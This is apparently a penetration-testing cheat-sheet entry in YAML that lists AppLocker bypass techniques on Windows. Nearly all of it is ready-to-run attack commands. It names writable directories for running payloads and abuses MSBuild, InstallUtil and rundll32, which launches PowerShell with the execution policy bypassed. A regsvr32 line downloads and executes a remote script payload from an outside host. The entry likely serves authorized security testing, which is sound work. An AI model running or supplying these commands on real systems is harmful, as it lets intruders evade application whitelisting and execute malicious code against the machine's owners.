---
description: |
  AppLocker bypass techniques — writable directories, trusted binaries (MSBuild, InstallUtil, Rundll32, Regsvr32), and living-off-the-land execution.
command: |
  # Check AppLocker policy
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

  # Common writable bypass directories
  C:\Windows\Tasks\
  C:\Windows\Temp\
  C:\Windows\tracing\
  C:\Windows\Registration\CRMLog\
  C:\Windows\System32\FxsTmp\
  C:\Windows\System32\com\dmp\
  C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
  C:\Windows\System32\spool\drivers\color\
  C:\Windows\System32\spool\PRINTERS\
  C:\Windows\System32\spool\SERVERS\
  C:\Windows\SysWOW64\Tasks\
  C:\Windows\SysWOW64\com\dmp\

  # Copy and execute from bypass directory
  copy C:\Temp\payload.exe C:\Windows\Tasks\payload.exe
  C:\Windows\Tasks\payload.exe

  # MSBuild bypass (execute C# inline)
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

  # InstallUtil bypass
  C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

  # Rundll32 bypass
  rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell");h.Run("powershell -ep bypass -f C:\\Windows\\Tasks\\script.ps1")

  # Regsvr32 bypass (download and execute SCT)
  regsvr32 /s /n /u /i:http://10.10.10.21/payload.sct scrobj.dll
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Windows
services: []
techniques:
  - Defense_Evasion
references:
  - https://github.com/api0cradle/UltimateAppLockerByPassList
  - https://lolbas-project.github.io/
---
